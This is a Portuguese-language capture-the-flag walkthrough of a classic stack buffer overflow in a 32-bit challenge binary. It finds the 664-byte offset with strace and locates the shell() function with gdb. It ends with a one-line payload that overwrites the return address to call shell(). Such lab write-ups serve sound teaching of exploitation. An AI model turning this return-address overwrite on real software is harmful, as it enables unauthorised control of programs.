
Vamos la...

Primeiro identificamos o arquivo usando o command #file   - no Linux.

[root:~/Documents/zc00l]# file ROP                                   (master✱)
ROP: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=311ae551205cd28e1347db56258df4f2d70b782d, not stripped


Vamos entao enviar uma certa quantidade de bytes para o programa e ver como ele se comporta. Como gosto muito de python, vamos usar python kkk
Enviaremos 200 bytes para comecar:
[root:~/Documents/zc00l]# ./ROP $(python -c "print 'A' * 200")       (master✱)
[root:~/Documents/zc00l]# ./ROP $(python -c "print 'A' * 300")       (master✱)
[root:~/Documents/zc00l]#  ## Como vcs podem ver, ate o momento nao hou erro de segmentacao. vamos enviar uma carga maior de bytes agora. 700 bytes
[root:~/Documents/zc00l]# ./ROP $(python -c "print 'A' * 700")       (master✱)
[1]    12595 segmentation fault  ./ROP $(python -c "print 'A' * 700")
[root:~/Documents/zc00l]#  Agora com uma carga de 700 bytes, conseguimos identificar claramento o bug, quando enviamos uma certa quantidade de pacotes o programa da error.
Como identificar o numero? (si_addr) Vamos usar o STRACE pra isso.
Precisamos saber com quantos bytes conseguimos causar um overflow, para sabermos quantos bytes [e] necessario, faremos o seguinte.
Vamos usar o (strace) para analisar a aplicacao ou seja, o strace monitora as chamadas de sistema (system calls) e os sinais recebidos pela aplicacao, caso nao tenha instalado se estiver usando distro based in debian use o seguinte comando (# apt install strace)
[root:~/Documents/zc00l]# strace ./ROP $(python -c "print 'A' * 700")     ##Analisando a saida do comando conseguimos observar o si_addr=0x41414141}

Vamos diminuir um pouco mais para sabermos o momento certo, onde entra os (A) que enviamos.
[root:~/Documents/zc00l]# strace ./ROP $(python -c "print 'A' * 660")  ## si_addr=0x4141413d} ---
[root:~/Documents/zc00l]# strace ./ROP $(python -c "print 'A' * 664")  ## BINGOOO si_addr=0x41414141} ---Mas como sabemos que e este o endereco correto ? Simples, basta converter A em HEX. 
Voce pode utilizar o site: https://www.rapidtables.com/convert/number/ascii-to-hex.html   ou  pesquisar no google (ASCII to Hex text converter)
Apos sabermos que A em Hex [e] 41 - Entao essa e a quantidade ideal de bytes onde vamos conseguir sobrescrever a memoria e mudar o flux do programa.
Vamos enviar junto com os 664 bytes mais 4 Bytes e vamos ver se conseguimos mudar o fluxo. 
[root:~/Documents/zc00l]# strace ./ROP $(python -c "print 'A' * 664+'BBBB'")        ## BINGOO - conseguimos encontrar o offset- si_addr=0x42424242} que controla o endereco de retorno, agora vamos em buscar do endereco da funcao shell()---
Alem dos 664 bytes enviados, enviei mais 4 bytes logo consigo mudar o fluxo do programa. Com isso no lugar desse 4 bytes, podemos criar nosso payload e colocar um codigo malisioso para executar.             

O objetivo dessa chall e chamar a funcao shell(), mas como sabemos que existe esta funcao? Vamos usar o GDB 
Vamos debugar este arquivo usando o # gdb - GDB: The GNU Project Debugger - GNU.org - Para mais informacoes digite: #gdb --help
[root:~/Documents/zc00l]# gdb -q ./ROP                               (master✱)
Reading symbols from ./ROP...(no debugging symbols found)...done.
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x08048330  _init
0x08048370  strcpy@plt
0x08048380  system@plt
0x08048390  exit@plt
0x080483a0  __libc_start_main@plt
0x080483b0  fprintf@plt
0x080483d0  _start
0x08048400  __x86.get_pc_thunk.bx
0x08048410  deregister_tm_clones
0x08048450  register_tm_clones
0x08048490  __do_global_dtors_aux
0x080484c0  frame_dummy
0x080484c6  shell                    <<<<<<<<<<< #Funcao na qual falei anteriormente. Vamos pegar o endereco dela e converter em (little endian) vc pode usar perl ou python, eu vou de python kk
0x080484f5  vuln
0x0804852a  main
0x08048599  __x86.get_pc_thunk.ax
0x080485a0  __libc_csu_init
0x08048600  __libc_csu_fini
0x08048604  _fini
(gdb) 

Vamos usar o python em modo interativo para convertermos em little endian.
[root:~/Documents/zc00l]# python                                                                   (master✱) 
Python 2.7.14+ (default, Mar 13 2018, 15:23:44) 
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import struct #Aqui importamos a lib onde tem o pack para convertermos. para saber mais acess: https://docs.python.org/2/library/struct.html
>>> struct.pack("i",0x080484c6)    #(i) int // e passamos o endereco sa funcao.
'\xc6\x84\x04\x08'   # Conseguimos converter 

Agora que sabemos a quantidade exata para causarmos o overflow, vamos desenvolver o ~payload~, novamente vou utilizar Python uhu.

./ROP $(python -c "import struct; print('A'*664+struct.pack('i',0x080484c6))")

Pronto ao executar o comando acima, conseguimos completamente mudar o fluxo do programa. Ou seja, temos o controle total da aplicacao. 
Apos feito isso, conseguimos chamar a funcao shell().

Author: @Anakein
Salve ao mano @zc00l

